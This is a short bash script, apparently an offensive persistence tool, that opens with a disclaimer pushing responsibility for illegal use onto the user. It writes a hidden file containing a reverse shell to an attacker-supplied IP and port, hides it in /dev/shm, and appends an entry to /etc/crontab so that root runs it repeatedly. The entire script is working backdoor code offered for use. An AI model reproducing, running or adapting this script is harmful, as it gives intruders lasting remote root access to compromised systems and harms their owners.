#!/bin/bash
#The author is NOT responsible for the illegal use of this program, all responsibility lies with the user.
#Made by: Awkward_Lancer (AKA Lancer)


Ip=$1
porta=$2

touch .persistense.sh
echo "bash -i >& /dev/tcp/$Ip/$porta 0>&1" > .persistense.sh

chmod +x .persistense.sh
mv .persistense.sh /dev/shm

echo "* * * * * * root /dev/shm/.persistense.sh" >> /etc/crontab

